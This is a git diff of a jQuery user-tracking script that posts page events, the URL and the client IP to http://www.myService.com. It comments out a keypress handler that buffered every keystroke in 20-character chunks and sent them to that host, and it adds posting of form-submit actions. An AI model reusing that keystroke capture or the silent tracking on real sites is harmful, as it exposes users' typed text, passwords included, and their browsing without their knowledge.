@@ -26,20 +26,20 @@ $j(document).ready(function() {
 	});
 			
 	$j("body").append('<div id="divProxy" name="divProxy"></div>');
-	
-	document.onkeypress= function(event){  
-		if (event.target){
-			window.browSession = event.target.id;
-		}
-		else{
-			window.browSession = "";
-		}
-		teclado = teclado + event.key;
-		if (teclado.length==20){
-			submitData(event,"texto:"+teclado);
-			teclado="";
-		}
-    }; 
+//	
+//	document.onkeypress= function(event){  
+//		if (event.target){
+//			window.browSession = event.target.id;
+//		}
+//		else{
+//			window.browSession = "";
+//		}
+//		teclado = teclado + event.key;
+//		if (teclado.length==20){
+//			submitData(event,"texto:"+teclado);
+//			teclado="";
+//		}
+//    }; 
 	
 	$j(listaHTML).on("eventos", function(event) { 
 		if (event.target){
@@ -74,7 +74,9 @@ $j(document).ready(function() {
 	window.mouseXPos = e.pageX;  
 	window.mouseYPos = e.pageY;  
 	var data = '{position:{x:"' + mouseXPos + '", y:"' + mouseYPos + '"}, action:"'+ action + '", element:"'+ element + '"}';  
-// submitData(event,element);
+	if(action=="submit") {
+		submitData(e,action);
+	}	
 }); 
 	
 function onchange (event) {  
@@ -84,12 +86,14 @@ function onchange (event) {
 
 function submitData(event,element) {
 	if(event){
-		// alert(element + ',' + document.URL + ',' + $j.now() + ',' +
-		// window.browSession + ',' + pcIp);
+		var ip = "127.0.0.1";
+		var session="none";
+		if (window.browSession){ session=window.browSession; }
+		if (pcIp){ ip=pcIp; }
 		$j.ajax({
 			url:"http://www.myService.com",
 			type:"POST",
-			data: {data:element, url:document.URL, time:$j.now(), session:window.browSession, pcIp:pcIp?pcIp:'127.0.0.1'},
+			data: {data:element, url:document.URL, time:$j.now(), session:session, pcIp:ip},
 			success: function(data) {
 				// alert( \"Load was performed.\" );
 				return true; 
